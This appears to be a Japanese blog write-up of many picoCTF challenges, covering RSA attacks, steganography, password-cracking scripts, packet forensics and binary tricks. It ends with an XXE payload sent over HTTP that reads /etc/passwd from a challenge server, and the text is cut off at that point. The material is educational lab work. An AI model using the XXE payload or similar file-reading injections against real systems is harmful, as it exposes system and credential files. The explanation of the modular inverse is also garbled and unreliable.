$C = M^e \mod N$ より $C + iN = M^e$ （ $i$ は0以上の整数）と表せるから、 $M = (C + iN)^{1/e}$ と求めることができる。  
`barely larger`というもんだからせいぜい`i = 3`くらいだろうと思い`for`文を使って実装したが、実際のところは`i = 3533`で驚いた。

Tips: 

- 非常に大きな数の演算を行うには`gmpy2`ライブラリが使用できる
- crypto問題を解いた結果10進数が得られたとき、これを16進数に直して`unhexlify`するとflagが現れる場合がある

```python
import gmpy2
from binascii import unhexlify

n: int = 1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287
e: int = 3
c: int = 1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808145893251774383242888588567652079502880522005531571120463301333725071534050137246298274874319432561063978068140428652193294702808687000503934999928337234367205234422580586283326017530708854836817980318398277272759022724136418545105867685463283579824831916699431331460258806680372323026200534791012439563034432826050072742892112790177234284090476467119938191076883854821999876464545771711445501514467804193760659882386680300508589975451301720477703627085437101600726487172968870448635983769708507451946168500510817590720157574816563284526466526806699820426206566718022595284382939272542309819250701217431454132436646725890151031992160610219312035760562959174778547776304922277751548955049884940378

for i in range(4000):
    m, is_M_int = gmpy2.iroot(c + i*n, e)
    if is_M_int:
        break

m = unhexlify(hex(m)[2:])

print(f"{i=}, {m=}")
```

```terminal
$ python3 mini.py
i=3533, m=b'
                                            picoCTF{e_sh0u1d_b3_lArg3r_0b39bbb1}'
```

### Dachshund Attacks (crypto, 80)

RSA暗号におけるe, n, cが与えられて平文mを求める問題。dが小さいという前提があるので、"Wiener's attack"を用いるとdが求められる。  
※参考：<https://zenn.dev/anko/articles/ctf-crypto-rsa>

Wiener's attackを実装したPythonプログラムはインターネット上に転がっているため、これを活用することでmを計算可能である。今回は`orisano/owiener`という実装を利用した。  
※pipでもインストールできたが、自分の環境ではうまく動かなかったため、`curl -O https://raw.githubusercontent.com/orisano/owiener/master/owiener.py`でプログラムを保存して利用した。

```python
from pwn import *
from binascii import unhexlify
import gmpy2
import owiener

io = remote("mercury.picoctf.net", 30761)

io.recvuntil("e: ")
e: int = int(io.recvline().strip())
io.recvuntil("n: ")
n: int = int(io.recvline().strip())
io.recvuntil("c: ")
c: int = int(io.recvline().strip())

d: int|None = owiener.attack(e, n)
if d is None:
    print("failed!")
else:
    m_hex: str = hex(gmpy2.powmod(c, d, n))[2:]
    m: bytes = unhexlify(m_hex)
    print(f"{d=}, {m=}")
```

```terminal
$ python3 dach.py
[+] Opening connection to mercury.picoctf.net on port 30761: Done
/mnt/c/Users/gifbl/Downloads/picoCTF/dach.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil("e: ")
/mnt/c/Users/gifbl/Downloads/picoCTF/dach.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil("n: ")
/mnt/c/Users/gifbl/Downloads/picoCTF/dach.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil("c: ")
d=5271655008161221392583482590320929446536979899324799731505460183070683805717, m=b'picoCTF{proving_wiener_8652838}'
[*] Closed connection to mercury.picoctf.net port 30761
```

### Trivial Flag Transfer Protocol (forensics, 90)

wiresharkを使い各ファイルを保存する。ファイルにはbmp画像3枚と何らかのdeb、そして謎の文字列2つがあった。

まずdebファイルをみてみると、`steghide`というプログラムであった。これは画像などに文字列を隠すプログラムである。文字列を取り出す際は、隠したときに設定したパスワードを入力しないといけない。
対応する画像フォーマットにbmpがあり、先ほど保存した画像もbmpだったので、このツールを用いて画像からflagを取り出すのではないか。

次に謎の文字列を調べる。わからなかったのでwriteupを見ると、rot13で暗号化されているようだったので、復号する。
復号後、読みやすいように単語を分かち書きしたものを以下に示す。

[instructions.txt]

```txt
TFTP DOESNT ENCRYPT OUR TRAFFIC SO WE MUST DISGUISE OUR FLAG TRANSFER.
FIGURE OUT AWAY TO HIDE THE FLAG AND I WILL CHECK BACK FOR THE PLAN
```

[plan]

```txt
I USED THE PROGRAM AND HID IT WITH-DUEDILIGENCE.
CHECK OUT THE PHOTOS
```

[plan]に「`DUEDILIGENCE`を使って隠した」とあるので、おそらくこれがパスワードである。
このパスワードを用いて、各画像に対し`steghide extract -sf picture1.bmp`のようにして文字列を取り出そうとした。するとpicture1,2では失敗するが、picture3で成功し、flagを取り出すことができた。

見たwriteup: <https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Forensics/Trivial%20Flag%20Transfer%20Protocol/Trivial%20Flag%20Transfer%20Protocol.md>

## 100pt

### vault-door-1 (rev, 100)

javaソースを覗くと、入力文と正しいパスワードを1文字ずつ比較し、正しいパスワードか判定する関数が書かれているので、こいつからがんぱってパスワードを復元すればよい。

### what's a net cat? (general, 100)

`nc jupiter.challenges.picoctf.org 25103`

### strings it (general, 100)

stringsコマンドで文字列を抽出し、どこにフラグがあるか探す。探す際は`strings strings | grep "CTF"`などとすれば簡単。自分は`strings strings | less`で/押して検索した。

### Easy1 (crypto, 100)

One-time-padを解く問題。暗号用テーブルが与えられるので、これを用いて復号する。
まず暗号化について説明する。テーブルの上と左にABC..。と書かれているが、暗号化したい文字と同じ列（行）で、鍵の文字と同じ行（列）にある文字が、暗号化された文字である。これを平文の長さだけ繰り返すことで、平文全体を暗号化できる。
これを踏まえると、鍵の文字と同じ行（列）を見たときに、暗号化された文字がある列（行）のアルファベットが、復号した文字であるとわかる。

### 13 (crypto, 100)

ROT13で復号すればよい。
参考までに、作成したC++プログラムを記す。

```cpp
#include <iostream>
#include <string>
using namespace std;

int main() {
  string s;
  cout << "please input ciphertext: ";
  cin >> s;

  for (char c : s) {
    if (c >= 'a' && c <= 'z') {
      c = (char)('a' + (c - 'a' + 13) % 26);
    } else if (c >= 'A' && c <= 'Z') {
      c = (char)('A' + (c - 'A' + 13) % 26);
    }
    cout << c;
  }
  cout << endl;

  return 0;
}
```

### caesar (crypto, 100)

タイトルからシーザー暗号と予想したが、文字をどの程度ずらせば良いかわからなかったので、i = 1, 2, ..., 10文字ずらした文字列をすべて出力してみた（以下にプログラムを示す）。その結果、5文字ずらした文字列が、意味の通った英文に見えたので、それを出力したら正解だった。

```cpp
#include <iostream>
#include <string>
using namespace std;

int main() {
 string cipher = "ynkooejcpdanqxeykjrbdofgkq";

 for (int move = 0; move < 10; ++move) {
  for (char c : cipher) {
   cout << (char)((c - 'a' + move) % 26 + 'a');
  }
  cout << endl;
 }
}
```

### Bases (general, 100)

`echo bDNhcm5fdGgzX3IwcDM1 | base64 -d`

### First Grep (general, 100)

`cat file | grep picoCTF`

### Codebook (general, 100)

ダウンロードしたプログラムを実行するだけ。

### convertme.py (general, 100)

ダウンロードしたプログラムを実行し、指示にしたがって2進数を入力すればよい。

### fixme1.py fixme2.py (general, 100)

どちらもsyntax errorを排除するだけ。

### HashingJobApp (general, 100)

任意文字列のmd5ハッシュ値をlinuxターミナル上で出力するには、`md5sum`コマンドなどを用いて、`echo -n "任意文字列" | md5sum' とすればよい。
ここでechoのオプションとして`-n`（末尾の改行の無視？）をつけている。これを付与しないと正しいmd5ハッシュが出力されないため注意。

参考:
<https://qiita.com/aki3061/items/32f61e33a795d2f5d8c7>

### PW Crack 1 (general, 100)

level1.pyを実行するとパスワードを要求される。ソースコードを見ると、

```python
if( user_pw == "1e1a"):
 print("Welcome back... your flag, user:")
```

とあるから、パスワードとして`1e1a`を入力すればよいとわかる。

### PW Crack 2 (general, 100)

1と同様にパスワードを要求される。ソースコードを見ると

```python
if( user_pw == chr(0x33) + chr(0x39) + chr(0x63) + chr(0x65) ):
        print("Welcome back... your flag, user:")
```

とある。ここで、ターミナル上のpythonで`chr(0x33) + chr(0x39) + chr(0x63) + chr(0x65)`を入力すると。`39ce`と出力されるから、これがパスワードである。

```python
$ python3
Python 3.10.4 (main, Apr  2 2022, 09:04:19) [GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> chr(0x33) + chr(0x39) + chr(0x63) + chr(0x65)
'39ce'
```

### PW Crack 3 (general, 100)

またもパスワード要求がなされる。ソースを見ると、ご丁寧にパスワード候補が書いてある。

```python
# The strings below are 7 possibilities for the correct password.
#   (Only 1 is correct)
pos_pw_list = ["6997", "3ac8", "f0ac", "4b17", "ec27", "4e66", "865e"]
```

候補は7個しかないので、1つ1つ手作業で確認してもいいだろうし、次の問題（PW Crack 4）のような解き方をしてもよい。

### PW Crack 4 (general, 100)

やはりパスワードを要求される。ソースを覗くと、前問（PW Crack 3）では7個しかなかったパスワード候補が、100個に増えている。

```python
# The strings below are 100 possibilities for the correct password.
#   (Only 1 is correct)
pos_pw_list = ["158f", "1655", "d21e", "4966", "ed69", "1010", "dded", "844c", "40ab", "a948", "156c", "ab7f", "4a5f", "e38c", "ba12", "f7fd", "d780", "4f4d", "5ba1", "96c5", "55b9", "8a67", "d32b", "aa7a", "514b", "e4e1", "1230", "cd19", "d6dd", "b01f", "fd2f", "7587", "86c2", "d7b8", "55a2", "b77c", "7ffe", "4420", "e0ee", "d8fb", "d748", "b0fe", "2a37", "a638", "52db", "51b7", "5526", "40ed", "5356", "6ad4", "2ddd", "177d", "84ae", "cf88", "97a3", "17ad", "7124", "eff2", "e373", "c974", "7689", "b8b2", "e899", "d042", "47d9", "cca9", "ab2a", "de77", "4654", "9ecb", "ab6e", "bb8e", "b76b", "d661", "63f8", "7095", "567e", "b837", "2b80", "ad4f", "c514", "ffa4", "fc37", "7254", "b48b", "d38b", "a02b", "ec6c", "eacc", "8b70", "b03e", "1b36", "81ff", "77e4", "dbe6", "59d9", "fd6a", "5653", "8b95", "d0e5"]
```

さすがに手作業ではきついので、ソースを改変して解いた。
具体的には、2箇所を改変した。
まず、元あったパスワード比較関数は標準入力（キーボード）からパスワードを入力していたが、それを引数として渡すように変更した。

```python
def level_4_pw_check_auto(user_pw):
    # user_pw = input("Please enter correct password for flag: ")
    user_pw_hash = hash_pw(user_pw)

    if( user_pw_hash == correct_pw_hash ):
        print("Welcome back... your flag, user:")
        decryption = str_xor(flag_enc.decode(), user_pw)
        print(decryption)
        return
    print("That password is incorrect")
```

次に、与えられたパスワード候補`pos_pw_list`の全パスワードを、さきほど作成した関数に、for文で渡すようにした。

```python
for pw in pos_pw_list:
 level_4_pw_check_auto(pw)
```

こうすることで、全パスワード候補を確かめることができ、flagが得られる。

### PW Crack 5 (general, 100)

パスワードが要求される。問題文によると、`dictionary.txt`にパスワード候補が載っているとのことだが、候補があまりにも多すぎる。
そのため前問（PW Crack 4）と同様、ソースコードを改変して、自動でパスワードを見つけて解くことにする。

前問と似ているため解説はしないが、参考に改変したコードを次に示す。

```python
def level_5_pw_check(user_pw):
    # user_pw = input("Please enter correct password for flag: ")
    user_pw_hash = hash_pw(user_pw)

    if( user_pw_hash == correct_pw_hash ):
        print("pass:", user_pw)
        print("Welcome back... your flag, user:")
        decryption = str_xor(flag_enc.decode(), user_pw)
        print(decryption)
        return
    # print("That password is incorrect")

# openブロック内で定義した変数はブロック外でも参照できるらしい
with open("dictionary.txt", "r") as dic:
 lines = dic.readlines()
 lines_strip = [l.strip() for l in lines] # 改行コードの削除

for l in lines_strip:
 level_5_pw_check(l)
```

参考: open()でファイルを開く
<https://note.nkmk.me/python-file-io-open-with/>

### Serpentine (general, 100)

プログラムを起動してbを入力すると、`print_flag()関数を配置してなかった`と言われる。ソースを見ると、`print_flag()`関数は定義されているが、どこにも使われていないことがわかる。そのため、適当な位置にこの関数を追加してやればよい。

たとえばbを押した際にflagを表示するには、

```python
elif choice == 'b':
      # print('\nOops! I must have misplaced the print_flag function! Check my source code!\n\n')
      print_flag()
```

のようにすればよい。

### basic-file-exploit (binary, 100)

与えられたncコマンドを実行すると、対話型プログラムが起動する。1を押すと好きな文章をDBに格納し、2を押すと取り出す。また3で終了する。
ソースコード中の、flagが関係している箇所を確認すると、こんな記述があった。

```c
if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }
```

これは、プログラム起動時に2を押した際に実行される関数`data_read()`の中にある記述である。
`strtol(entry, NULL, 10)`では、入力文字列`entry`を10進数の数値に変換している。上記のif文では、この戻り値が0のときに、flagを出力（`puts(flag)`）していることがわかる。
ここで、strtol()の戻り値が0となるのはどんな場合かを調べると、文字列を数値に変換できない場合であるとわかる。
つまり、次のようにすればflagが得られることになる。なお、DBに文字列が何も入っていない状態で2を押しても何も起きないため、最初に1を押してなにかデータを入れておく必要があることに注意する。

1. `nc saturn.picoctf.net 55825`を実行
2. まず1を押し、なにかデータを格納する
3. その後2を押し、"Please enter the entry number of your data:"と表示されたら何か文字列を入力する

実行例を下に示す。

```sh
$ nc saturn.picoctf.net 55825
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
asd
asd
Please enter the length of your data:
3
3
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
fasf
fasf
picoCTF{ここにflagが表示される}
```

参考: strtol()について
<http://www9.plala.or.jp/sgwr-t/lib/strtol.html>

### basic-mod1 (crypto, 100)

指示に従えば解ける。参考までに作成したプログラムを示す。

```python
with open("message.txt", "r") as file:
 msgs = [int(msg) for msg in file.read().split()]

s = ""
for m in msgs:
 m = m % 37
 if 0 <= m and m <= 25:
  c = chr(ord('A') + m)
 elif 26 <= m and m <= 35:
  c = str(m - 26)
 else:
  c = '_'
 s = s + c

print("picoCTF{" + s + "}")
```

### basic-mod2 (crypto, 100)

basic-mod1とほぼ同じなので、異なる点について説明する。
この問題では、massage.txtに書かれた数字を41で割ったあまりを求めたあとに、その逆元を求める必要がある。ここでaの逆元とは、`a * a^(-1) = 0 (mod 41)`となるような`a^(-1)`のことをいう。
Pythonで逆元を求めるには、組み込みのpow()関数を用いて、`pow(a, 41, -1)`とすればよい。ここで41は法である。

### Enhance! (forensics, 100)

svgファイルが与えられる。画像ビューワで見ると黒い丸が表示された。`cat`でファイルの中身を表示したところ、flagが細切れの状態で書かれていた。それらをまとめて提出したら正解だった。

### file-run1 (rev, 100)

`file`コマンドでファイルの種類を調べると64bit実行ファイルだったので、`chmod`でアクセス権変更してから`./run`で実行。flagが得られた。

### file-run2 (rev, 100)

file-run1と同様に実行すると失敗する。引数として`Hello!`を渡して実行すればflagが得られる。

### File types (forensics, 100)

ファイルの中身を`cat`で見ると、シェルコードがいろいろ書かれている。そこに「sh <ファイル名>と実行すれば解凍される」などと書かれているので、その通りに`sh Flag.pdf`を実行する。
さらにar -> cpio -> bzip2 -> gzip -> lzip -> lz4 -> lzma -> lzop -> lzip -> xzと解凍していく。
最終的にASCIIテキストが得られるのだが、どうデコードすればよいかわからない。そのため一括で複数の方式に変換してくれるサイトを用いたところ、shift_jisもしくはUTF-8でデコードするとflagが得られることがわかった。

注意）gzipを解凍する際は、ファイルの拡張子をgzなどにしないと動かないようだ。
<https://qiita.com/aki3061/items/35522a8468ece5319f0d>
同様に、lzmaのときは拡張子を`.xz`に、lzopの時は`.lzo`、xzの時は`.xz`にする必要がある。

注意）最初の`sh Flag.pdf`は、`sharutils`がインストールされていないと動かないようだ。

### GDB Test Drive (rev, 100)

指示された通りに実行すればok。

### Inspect HTML (web, 100)

F12を押してwebページのソースを表示させると、flagがコメントアウトされている。

### Local Authority (web, 100)

適当な名前/パスワードを入れてログイン失敗したあとにページのソースを見ると、`secure.js`というファイルが見える。この中にユーザ名/パスワードが書かれているのでそれを使えばログインできる。

### Lookey here (forensics, 100)

ダウンロードしたtxtファイルを`less`で開き。`/`を押して検索モードに移行し、`pico`と検索したらflagが得られた。
想定解は`cat anthem.flag.txt | grep pico`のようにgrepを利用する手法らしい。

### patchme.py (rev, 100)

`patchme.flag.py`のコードを見ると、入力すべきユーザ名が書かれている。そのユーザ名を`patchme.flag.py`に入力すればflagが得られる。

### Redaction gone wrong (forensics, 100)

ダウンロードしたpdfファイルを開くと、黒塗り文書が表示される。
しかし、こうした文書では一般的に、黒塗りされた部分も選択することができる。
そのため、全体を選択してからメモ帳か何かに貼り付ければ、黒塗り部分の内容を確認することができる。
そこにflagが書かれている。

### Safe Opener (rev, 100)

ダウンロードしたjavaプログラムを見ると、入力をBase64エンコードしたものと、flagをBase64エンコードしたものが等しければ、flagを出力する処理を行うらしい（ちらっと見ただけなので違うかもしれない）。
flagをBase64エンコードした文字列がプログラム中に書かれているので、これをデコードすればよい。Linuxコマンドライン上では

```sh
echo "ここにBase64エンコードした文字列" | base64 -d
```

でデコードできる。

### Search source (web, 100)

`style.css`にflagが隠されていた。

### Sleuthkit Intro (Forensics, 100)

`mmls`コマンドを使ってみようという問題。`mmls`はディスクイメージの構造を調べるコマンドらしい。
ダウンロードした`disk.img`に対し`mmls`コマンドを使うと以下の出力が得られる。

```sh
$ mmls disk.img
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000204799   0000202752   Linux (0x83)
```

知りたいのはLinuxパーティションのサイズであるから、`Length`の項に書かれた`202752`が答えである。
指定されたサーバに`nc`コマンドで接続し、その答えを入力すればflagが得られる。

```sh
$ nc saturn.picoctf.net 52279
What is the size of the Linux partition in the given disk image?
Length in sectors: 202752
202752
Great work!
picoCTF{ここにflagが表示される}
```

### unpackme.py (rev, 100)

ダウンロードしたpythonプログラムを見ると、本命のコードは暗号化されており、実行中にそれを復号しているようだ。
そのため、復号されたタイミングでそのコードをprintしてやれば確認できる。
具体的には、プログラムの最終行（`exec...`）の手前に`print(plain.decode())`などを書き加えてから実行すればよい。

復号されたコードを見ればflagがわかる。内容は非常に簡単なので、ここでは説明しない。

### First Find (general, 100)

`find`コマンドを使う。

### buffer overflow 0 (binary, 100)

`vuln.c`と`vuln`をダウンロード。
（自分の環境では実行可能ファイル`vuln`を`./vuln`と実行しようとするとエラーがでて実行できなかった。実行権限も`chmod a+x vuln`で付与したので、なぜ動かないのかはわからない。しかしこの問題では`vuln.c`しか使わないので詳しくは調べなかった）

`vuln.c`を見ると、`sigsegv_handler()`という関数でflagが出力されているように見える。
この関数が呼ばれるのはメイン関数内で`SIGSEGV`が生じたとき、つまりセグメンテーションエラー(メモリ関係のエラー)が起こったときである。
さらに`main()`を読み進めると、入力を`buf1[100]`に格納する処理があった。ここで100文字以上の文字列を入力してやれば、想定されていない部分までメモリに書き込んでしまい、セグメンテーションエラーが出るはずである。そうすれば上記よりflagが得られる。

というわけで問題文にある通り`nc saturn.picoctf.net 51110`でプログラムが走っているサーバに接続し、入力を求められたら100文字以上の文字列を渡してやる。するとセグメンテーションエラーが発生し、flagが出力される。

### CVE-XXXX-XXXX (binary, 100)

<https://cve.mitre.org/cve/search_cve_list.html> で`Windows Print Spooler Service 2021 Remote code execution`と検索して、一番番号が小さい（2021年最初に出た）脆弱性がflagである。

### Packets Primer (forensics, 100)

wiresharkなどでパケットを見る。
4つ目のフレーム（`4 0.001225 10.0.2.15 10.0.2.4 TCP 126 48750 → 9000 [PSH, ACK] Seq=1 Ack=1 Win=64256 Len=60 TSval=2379213157 TSecr=1760620995`）で送られたデータにflagが隠されている。

### Big Zip (general, 100)

ダウンロードしたzipファイルを解凍するととんでもない数のファイルができる。その中から手動でflagを探すのはさすがにきつい。

そこで`find`コマンドを使い、解凍した全ファイルについて`grep "picoCTF" <ファイル名>`を実行すればよい。
ファイルの数が多いので数分かかるが、以下コマンドを実行すればflagが見つかる。

```sh
find -type f -exec grep "picoCTF" {} \;
```

参考: <https://hydrocul.github.io/wiki/commands/find.html>

### Wireshark twoo twooo two twoo... (forensics, 100)

わからないのでWriteupを見た。
<https://qiita.com/housu_jp/items/2f31e27bc9cfba6d50d3>

以下は学んだことまとめ。

- 統計→プロトコル階層を見て、パケット数の少ないプロトコルから順に調べる
  - プロトコルを右クリックして「フィルターとして適用」から「選択済み」を押せばそのプロトコルのパケットだけ見られる
  - 現在のフィルターに重ねがけしたいときは「かつ選択内容と一致」とかを選べばよい
  - ちなみに「選択されていません」というのは!(filter)という意味
- 統計→終端（エンドポイント）を見れば、誰が通信しているかといった通信の全体像がわかる
  - パケット数でソートして多いやつがメインキャラ。プロトコル階層と同じく右クリックすればフィルター適用できる
  - 8.8.8.8はGoogleのDNS
  - 192.168.X.Xはローカル
  - 普通はDNSパケットはDNSサーバにしか送らないはずなので、送信先が8.8.8.8とか以外ならおかしい
- フィルターかけて怪しげなIPだけ表示し、プロトコル階層を見る。そして各プロトコルのパケットを見ていく
- DNSサーバには2つある
  - DNSキャッシュサーバ（フルサービスリゾルバー）：対応表を持ってない。周りの人に聞きまくって教えてもらう。問い合わせに答えられなければ死あるのみ
  - 権威DNSサーバ：対応表（ゾーンファイル）を持っている。そこになければないですねと返す
- なお、DNSサーバを装ったC2サーバを設置し、感染端末からその偽DNSサーバにデータを送信・漏洩させる攻撃（DNSトンネリング）があるらしく、これをモデルにした問題説がある
  - <https://www.lac.co.jp/lacwatch/alert/20160201_000310.html>
  - 名前解決を行う際に外部のDNSサーバに問い合わせることはごく普通に有り得ることであり、DNSプロトコルの制限を行うことは少ないため、これを抜け穴として攻撃ができる

### advanced-potion-making (forensics, 100)

fileコマンドを使っても`data`としか出ない。stringsコマンドを使ってみると`IHDR`という文字列が含まれていることがわかったので、PNGファイルではないかと推測。しかし画像ビューアーでは開けない。

バイナリエディターで開いてみると、先頭が

```hex
89 50 42 11 0d 0a 1a 0a  00 12 13 14 49 48 44 52
```

となっていた。PNGファイルの先頭は以下が正しい（*で囲んだ部分が相違点）ので、正しく修正する。ちなみにpngの構造についてまとめてあるサイトは<https://www.setsuki.com/hsp/ext/png.htm>。

```hex
89 50 *4E* *47* 0d 0a 1a 0a  00 *00* *00* *0d* 49 48 44 52
```

修正したら一面真っ赤な画像が表示された。まだ何か修正が必要かと思ったが、これ以外の部分には間違いは見られなかった。またsRGB, gAMA, pHYsといった補助チャンクも含まれていたが、これらもおかしな部分はなかった（強いて言えばgAMAはあまり使われないので不自然という程度）。

わからないのでWriteupを見る。「Stegsolve」を使うとflagがわかるらしい。インストールが面倒なので<https://www.aperisolve.com>に頼る。たしかにflagがわかった。

`picoCTF{w1z4rdry}`

が…結局Bit Planeとは何なのか？

> たとえば、赤色の値が160(0xA0)ならば、2進数では10100000となります。ここで、最下位ビットのビット0を書き換えて、2進数で10100001にしても、人間が視覚で色の違いを認識することは困難です。つまり、色情報として、最下位ビットのビット0あるいはビット1は、書き換えても色の見た目にほとんど影響がないといえます。これにより、画像を構成する各ピクセル(画素)に対して、色情報のビット0やビット1に、任意のバイナリデータをビット単位に分解したものを埋め込んでも、画像としては見た目に変化がなく、データの隠ぺいが可能になります。このような任意のデータの隠ぺい技術を「ステガノグラフィー（steganography）」と呼びます。
> （<https://digitaltravesia.jp/usamimihurricane/webhelp/_RESOURCE/MenuItem/another/anotherAboutSteganography.html> より）

つまり赤色の値の1ビット目（LSBなので00000001、つまり一番右のビット）だけを取り出して、0と1のバイナリ画像にしたものが「Red plane 0」（0-indexedなので）にあたるというわけだ。同様に、青色の値の2ビット目（LSBで00000010、すなわち右から2番目のビット）だけを取り出したバイナリ画像は「Blue plane 1」となる。

### PcapPoisoning (forensics, 100)

とりあえずプロトコル階層を見る。FTP Dataが非常に多いが、各パケットに不審な点は見られない。
ふと5番目のパケットを見るとユーザ名とパスワードが送信されていたので、左側の矢印（[正式名称はRelated packetsらしい](https://www.opensourcetech.tokyo/entry/2019/02/09/Wireshark2.0%E3%81%A7%E5%AE%9F%E8%A3%85%E3%81%95%E3%82%8C%E3%81%9F%E3%80%8CRelated_packets%E3%80%8D%E6%A9%9F%E8%83%BD%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E7%9F%A5%E3%82%8B)）を参考にして対応するパケットを見てみる。対応していたのは507番目のパケットであり、ここにflagが書かれていた。

`picoCTF{P64P_4N4L7S1S_SU55355FUL_5b6a6061}`

### hideme (forensics, 100)

`strings flag.png`すると`secret/flag.png`という記載が見えた。不審に思い`binwalk flag.png`すると案の定隠しデータがあった。

```sh
$ binwalk flag.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 512 x 504, 8-bit/color RGBA, non-interlaced
41            0x29            Zlib compressed data, compressed
39739         0x9B3B          Zip archive data, at least v1.0 to extract, name: secret/
39804         0x9B7C          Zip archive data, at least v2.0 to extract, compressed size: 2959, uncompressed size: 3108, name: secret/flag.png
42998         0xA7F6          End of Zip archive, footer length: 22
```

`binwalk -e flag.png`で隠しデータを抽出し、出てきた`secret/flag.png`にflagが書かれていた。

`picoCTF{Hiddinng_An_imag3_within_@n_ima9e_dc2ab58f}`

### who is it (forensics, 100)

emlファイル（メールのテキストデータ）が与えられる。文量が多くどこから見ればいいかわからなかったが、`Received`の行を下から見ていけば、送信者から受信者までの流れがわかる[とのこと](https://www.dos-osaka.co.jp/ss1/ss1lab/2023/04/trend-m-emotet.html#:~:text=%E3%81%84%E3%81%BE%E3%81%99%E3%81%8C%E3%80%81-,%E3%81%93%E3%81%AE%E4%B8%AD%E3%81%8B%E3%82%89,-%E3%80%8CReceived%3A%E3%80%8D%E3%81%A7%E5%A7%8B%E3%81%BE%E3%82%8B)。

一番下のReceivedは次の通り。`API id`が気になるが、ここからわかることはない。

```eml
Received: from localhost
 by mail.onionmail.org (ZoneMTA) with API id 181dc76dff2000ccee.001
 for <francismanzi@gmail.com>;
 Fri, 08 Jul 2022 06:19:47 +0000
```

下から2番目のReceivedは次の通り。`173.249.33.206`のメールサーバから来ていることがわかる。

```eml
Received: from mail.onionmail.org (mail.onionmail.org. [173.249.33.206])
        by mx.google.com with ESMTPS id f16-20020a05600c4e9000b003a1947873d6si1882702wmq.224.2022.07.07.23.19.47
        for <francismanzi@gmail.com>
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 07 Jul 2022 23:19:47 -0700 (PDT)
```

ここで`173.249.33.206`を[Whoisで調べると](https://www.whois.com/whois/173.249.33.206)、メールサーバの管理者らしき名前が見えた。

```txt
person: Wilhelm Zwalina
```

これが答えである。

`picoCTF{WilhelmZwalina}`

### findme (web, 100)

与えられたサイトでユーザ名を`test`、パスワードを`test!`にしてログインすると、何回かリダイレクトしてから`Our Bank`というページに遷移する。
このリダイレクト先をBurpSuiteでよく見てみると、

```txt
/
↓
/next-page/id=cGljb0NURntwcm94aWVzX2Fs
↓
/next-page/id=bF90aGVfd2F5X2JlNzE2ZDhlfQ==
↓
/home
```

というふうに遷移しており、idがBase64のように見えるので復号してみる。するとflagが得られた。

```sh
$ echo cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5X2JlNzE2ZDhlfQ== | base64 -d
picoCTF{proxies_all_the_way_be716d8e}
```

### SOAP (web, 100)

detailを押すと`/data`に`id`（1～3）がPOSTされる。BurpSuiteで通信をinterceptして`id=4`とか`id=-1`といったデータを送ってみたところ、`Invalid ID: 4`のように表示されることがわかった。

タグにXXEとあったので調べてみた。

> XXE（XML External Entity: XML 外部エンティティ参照, XML 外部実体） は、アプリケーションが XML を解析した際に、XML の特殊構文を悪用されて発生する脆弱性です。
> （引用元：<https://yamory.io/blog/what-is-xxe/>）

たとえば以下のようなXMLを見てみよう。なお`<!DOCTYPE>`内のことをDTD、それ以降の部分をXMLインスタンスと呼ぶ。
このXMLでは`<!ENTITY>`内で"/etc/passwd"という文字列に`file`という名前（実体名）をつけており、それを`<ID>`の中で`&file;`として参照している。こうするとサーバ側では、クライアントからIDとして"/etc/passwd"のファイル自体（つまり"/etc/passwd"の中身）を受け取ったというふうに処理する。

```xml
<!DOCTYPE ID [
<!ENTITY file SYSTEM "/etc/passwd">
]>
<ID>
  &file;
</ID>
```

こうなると何がまずいのかというと、先ほど`id=4`を送ったら`Invalid ID: 4`と表示されたように、`id=<"/etc/passwd"の中身>`を送ったら`Invalid ID: <"/etc/passwd"の中身>`と表示されてしまう。これによって"/etc/passwd"を読むことができるのである。

手法はわかったので実践してみる。BurpSuiteで通信を傍受し、`<!DOCTYPE ID ... >`の部分を追記し、idを`&file;`に書き換える（以下のようになる）。これを送信する。

```txt
POST /data HTTP/1.1
Host: saturn.picoctf.net:52449
Content-Length: 61
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:52449
Referer: http://saturn.picoctf.net:52449/
Accept-Encoding: gzip, deflate, br
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ID [
<!ENTITY file SYSTEM "/etc/passwd">
]>
  <data>
    <ID>
      &file;
    </ID>
  </data>
```

すると狙い通り"/etc/passwd"を読むことができた。

```txt
